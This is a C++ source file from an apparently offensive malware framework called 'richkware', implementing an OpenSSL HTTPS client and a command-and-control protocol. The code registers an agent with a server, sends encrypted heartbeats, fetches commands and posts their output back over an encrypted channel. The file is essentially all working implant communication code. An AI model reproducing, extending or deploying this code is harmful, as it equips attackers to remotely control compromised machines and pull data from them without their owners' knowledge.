#include "richkware/network/client.hpp"
#include "richkware/crypto/cipher.hpp"
#include "richkware/utils/json.hpp"
#include <iostream>
#include <sstream>
#include <thread>
#include <cstring>

#include <openssl/ssl.h>
#include <openssl/err.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#endif

namespace richkware::network {

// HttpsClient implementation
class HttpsClient::Impl {
public:
    std::string server_address_;
    std::uint16_t server_port_;
    bool connected_ = false;
    SSL_CTX* ssl_ctx_ = nullptr;
    SSL* ssl_ = nullptr;
    int socket_ = -1;
    bool verify_certificate_ = true;
    std::string ca_certificate_path_;

    Impl() {
        SSL_library_init();
        OpenSSL_add_all_algorithms();
        SSL_load_error_strings();
        ssl_ctx_ = SSL_CTX_new(TLS_client_method());
        if (!ssl_ctx_) {
            // Handle error
        }
    }

    ~Impl() {
        if (ssl_) {
            SSL_shutdown(ssl_);
            SSL_free(ssl_);
        }
        if (socket_ != -1) {
#ifdef _WIN32
            closesocket(socket_);
            WSACleanup();
#else
            close(socket_);
#endif
        }
        if (ssl_ctx_) {
            SSL_CTX_free(ssl_ctx_);
        }
    }

    core::Result<void> connect(const std::string& address, std::uint16_t port) {
        server_address_ = address;
        server_port_ = port;

#ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            return core::RichkwareError{core::ErrorCode::NetworkError, "WSAStartup failed"};
        }
#endif

        socket_ = socket(AF_INET, SOCK_STREAM, 0);
        if (socket_ < 0) {
            return core::RichkwareError{core::ErrorCode::NetworkError, "Socket creation failed"};
        }

        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(server_port_);

        if (inet_pton(AF_INET, server_address_.c_str(), &server_addr.sin_addr) <= 0) {
            struct hostent* host = gethostbyname(server_address_.c_str());
            if (!host) {
#ifdef _WIN32
                closesocket(socket_);
                WSACleanup();
#else
                close(socket_);
#endif
                return core::RichkwareError{core::ErrorCode::NetworkError, "Host resolution failed"};
            }
            memcpy(&server_addr.sin_addr, host->h_addr, host->h_length);
        }

        if (::connect(socket_, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
#ifdef _WIN32
            closesocket(socket_);
            WSACleanup();
#else
            close(socket_);
#endif
            return core::RichkwareError{core::ErrorCode::NetworkError, "Connection failed"};
        }

        ssl_ = SSL_new(ssl_ctx_);
        SSL_set_fd(ssl_, socket_);

        if (SSL_connect(ssl_) <= 0) {
            ERR_print_errors_fp(stderr);
            return core::RichkwareError{core::ErrorCode::NetworkError, "SSL connection failed"};
        }
        
        connected_ = true;
        return core::Result<void>{};
    }

    void disconnect() {
        if (connected_) {
            if (ssl_) {
                SSL_shutdown(ssl_);
                SSL_free(ssl_);
                ssl_ = nullptr;
            }
            if (socket_ != -1) {
#ifdef _WIN32
                closesocket(socket_);
                WSACleanup();
#else
                close(socket_);
#endif
                socket_ = -1;
            }
            connected_ = false;
        }
    }

    core::Result<std::string> send_raw_request(const std::string& request) {
        if (!connected_ || !ssl_) {
            return core::RichkwareError{core::ErrorCode::NetworkError, "Not connected"};
        }

        if (SSL_write(ssl_, request.c_str(), request.length()) < 0) {
            return core::RichkwareError{core::ErrorCode::NetworkError, "SSL_write failed"};
        }

        char buffer[4096];
        std::string response;
        int bytes_received;

        while ((bytes_received = SSL_read(ssl_, buffer, sizeof(buffer) - 1)) > 0) {
            buffer[bytes_received] = '\0';
            response += buffer;
        }

        return response;
    }
};

HttpsClient::HttpsClient() : pimpl_(std::make_unique<Impl>()) {}
HttpsClient::~HttpsClient() = default;

std::future<core::Result<HttpResponse>> HttpsClient::send_request(const HttpRequest& request) {
    return std::async(std::launch::async, [this, request]() -> core::Result<HttpResponse> {
        // Build HTTP request string
        std::ostringstream oss;
        std::string method_str;
        
        switch (request.method) {
            case HttpMethod::GET: method_str = "GET"; break;
            case HttpMethod::POST: method_str = "POST"; break;
            case HttpMethod::PUT: method_str = "PUT"; break;
            case HttpMethod::DELETE: method_str = "DELETE"; break;
        }
        
        oss << method_str << " " << request.url << " HTTP/1.1\r\n";
        oss << "Host: " << pimpl_->server_address_ << "\r\n";
        
        for (const auto& header : request.headers) {
            oss << header.first << ": " << header.second << "\r\n";
        }
        
        if (!request.body.empty()) {
            oss << "Content-Length: " << request.body.length() << "\r\n";
        }
        
        oss << "Connection: close\r\n"; // Important for simple clients
        oss << "\r\n";
        
        if (!request.body.empty()) {
            oss << request.body;
        }
        
        auto result = pimpl_->send_raw_request(oss.str());
        if (!result) {
            return result.error();
        }
        
        HttpResponse response;
        // Super simplified parsing
        std::string http_version;
        std::string status_message;
        std::istringstream response_stream(result.value());
        response_stream >> http_version >> response.status_code >> status_message;
        
        // find body
        size_t body_start = result.value().find("\r\n\r\n");
        if(body_start != std::string::npos){
             response.body = result.value().substr(body_start + 4);
        }

        return response;
    });
}

core::Result<void> HttpsClient::connect(const std::string& address, std::uint16_t port) {
    return pimpl_->connect(address, port);
}

void HttpsClient::disconnect() {
    pimpl_->disconnect();
}

bool HttpsClient::is_connected() const noexcept {
    return pimpl_->connected_;
}

void HttpsClient::set_verify_certificate(bool verify) {
    pimpl_->verify_certificate_ = verify;
    if (pimpl_->ssl_ctx_) {
        int mode = verify ? SSL_VERIFY_PEER : SSL_VERIFY_NONE;
        SSL_CTX_set_verify(pimpl_->ssl_ctx_, mode, nullptr);
    }
}

core::Result<void> HttpsClient::set_ca_certificate(const std::string& cert_path) {
    pimpl_->ca_certificate_path_ = cert_path;
    if (pimpl_->ssl_ctx_) {
        if (SSL_CTX_load_verify_locations(pimpl_->ssl_ctx_, cert_path.c_str(), nullptr) != 1) {
            return core::RichkwareError{core::ErrorCode::NetworkError, "Failed to load CA certificate"};
        }
    }
    return core::Result<void>{};
}

// C2Protocol implementation
class C2Protocol::Impl {
public:
    INetworkClient& client_;
    crypto::CipherManager cipher_manager_;
    std::string server_base_url_;

    Impl(INetworkClient& client, std::string key)
        : client_(client), cipher_manager_()
    {
        (void)cipher_manager_.set_password(std::move(key));
        // Assume server is running on standard HTTPS port
        server_base_url_ = "https://server_address:8443/api";  // TODO: Make configurable
    }

    core::Result<std::string> send_encrypted(const std::string& endpoint, const std::string& data) {
        // Encrypt the data
        auto encrypted_result = cipher_manager_.encrypt_string(data);
        if (!encrypted_result) {
            return encrypted_result.error();
        }

        // Create HTTP request
        HttpRequest req;
        req.method = HttpMethod::POST;
        req.url = endpoint;
        req.body = encrypted_result.value();
        req.headers["Content-Type"] = "application/json";
        req.headers["Authorization"] = "Bearer " + std::string("agent_token");  // TODO: Implement proper auth

        // Send request
        auto future_response = client_.send_request(req);
        auto response_result = future_response.get();

        if (!response_result) {
            return response_result.error();
        }

        HttpResponse& response = response_result.value();
        if (response.status_code < 200 || response.status_code >= 300) {
            return core::RichkwareError{core::ErrorCode::NetworkError,
                "HTTP request failed with status: " + std::to_string(response.status_code)};
        }

        // Decrypt response
        auto decrypted_result = cipher_manager_.decrypt_string(response.body);
        if (!decrypted_result) {
            return decrypted_result.error();
        }

        return decrypted_result.value();
    }

    std::string generate_agent_id() {
        // Simple agent ID generation - in real implementation use UUID
        return "agent_" + std::to_string(std::time(nullptr));
    }
};

C2Protocol::C2Protocol(INetworkClient& client, std::string encryption_key)
    : pimpl_(std::make_unique<Impl>(client, std::move(encryption_key))) {}

C2Protocol::~C2Protocol() = default;

core::Result<void> C2Protocol::register_agent(const std::string& agent_info) {
    std::string payload = R"({
        "agent_id": ")" + pimpl_->generate_agent_id() + R"(",
        "info": ")" + agent_info + R"(",
        "timestamp": )" + std::to_string(std::time(nullptr)) + R"(
    })";

    auto result = pimpl_->send_encrypted("/register", payload);
    if (!result) {
        return result.error();
    }
    return core::Result<void>{};
}

core::Result<std::vector<C2Protocol::Command>> C2Protocol::fetch_commands() {
    std::string payload = R"({
        "agent_id": ")" + pimpl_->generate_agent_id() + R"(",
        "timestamp": )" + std::to_string(std::time(nullptr)) + R"(
    })";

    auto result = pimpl_->send_encrypted("/commands", payload);
    if (!result) {
        return result.error();
    }

    // Parse JSON response
    std::vector<Command> commands;
    try {
        auto json_response = nlohmann::json::parse(result.value());
        if (json_response.is_array()) {
            for (const auto& cmd_json : json_response) {
                Command cmd;
                if (cmd_json.contains(std::string("id"))) cmd.id = std::string(cmd_json[std::string("id")]);
                if (cmd_json.contains(std::string("type"))) cmd.type = std::string(cmd_json[std::string("type")]);
                if (cmd_json.contains(std::string("payload"))) cmd.payload = std::string(cmd_json[std::string("payload")]);
                cmd.timestamp = std::chrono::steady_clock::now();
                commands.push_back(cmd);
            }
        } else if (json_response.is_object() && !json_response.empty()) {
            // Single command
            Command cmd;
            if (json_response.contains(std::string("id"))) cmd.id = std::string(json_response[std::string("id")]);
            if (json_response.contains(std::string("type"))) cmd.type = std::string(json_response[std::string("type")]);
            if (json_response.contains(std::string("payload"))) cmd.payload = std::string(json_response[std::string("payload")]);
            cmd.timestamp = std::chrono::steady_clock::now();
            commands.push_back(cmd);
        }
    } catch (const nlohmann::json::parse_error&) {
        // If parsing fails, return empty commands
    }

    return commands;
}

core::Result<void> C2Protocol::send_response(const CommandResponse& response) {
    std::string payload = R"({
        "command_id": ")" + response.command_id + R"(",
        "success": )" + (response.success ? "true" : "false") + R"(,
        "output": ")" + response.output + R"(",
        "error": ")" + response.error + R"(",
        "timestamp": )" + std::to_string(std::chrono::duration_cast<std::chrono::seconds>(
            response.timestamp.time_since_epoch()).count()) + R"(
    })";

    auto result = pimpl_->send_encrypted("/response", payload);
    if (!result) {
        return result.error();
    }
    return core::Result<void>{};
}

core::Result<void> C2Protocol::send_heartbeat() {
    std::string payload = R"({
        "agent_id": ")" + pimpl_->generate_agent_id() + R"(",
        "timestamp": )" + std::to_string(std::time(nullptr)) + R"(
    })";

    auto result = pimpl_->send_encrypted("/heartbeat", payload);
    if (!result) {
        return result.error();
    }
    return core::Result<void>{};
}

// NetworkClient implementation
class NetworkClient::Impl {
public:
    std::string server_address_;
    std::uint16_t server_port_;
    std::string encryption_key_;
    bool use_tls_;
    std::unique_ptr<HttpsClient> http_client_;
    std::unique_ptr<C2Protocol> c2_protocol_;
    
    Impl(std::string address, std::uint16_t port, std::string key, bool tls)
        : server_address_(std::move(address)), server_port_(port), 
          encryption_key_(std::move(key)), use_tls_(tls) {}
};

NetworkClient::NetworkClient(std::string server_address, std::uint16_t server_port,
                           std::string encryption_key, bool use_tls)
    : pimpl_(std::make_unique<Impl>(std::move(server_address), server_port, 
                                   std::move(encryption_key), use_tls)) {}

NetworkClient::~NetworkClient() = default;

core::Result<void> NetworkClient::initialize() {
    pimpl_->http_client_ = std::make_unique<HttpsClient>();
    
    pimpl_->c2_protocol_ = std::make_unique<C2Protocol>(
        *pimpl_->http_client_, pimpl_->encryption_key_
    );
    
    return core::Result<void>{};
}

core::Result<void> NetworkClient::connect() {
    if (!pimpl_->http_client_) {
        return core::RichkwareError{core::ErrorCode::NetworkError, "Client not initialized"};
    }
    
    return pimpl_->http_client_->connect(pimpl_->server_address_, pimpl_->server_port_);
}

void NetworkClient::disconnect() {
    if (pimpl_->http_client_) {
        pimpl_->http_client_->disconnect();
    }
}

bool NetworkClient::is_connected() const noexcept {
    return pimpl_->http_client_ && pimpl_->http_client_->is_connected();
}

C2Protocol& NetworkClient::protocol() noexcept {
    return *pimpl_->c2_protocol_;
}

} // namespace richkware::network
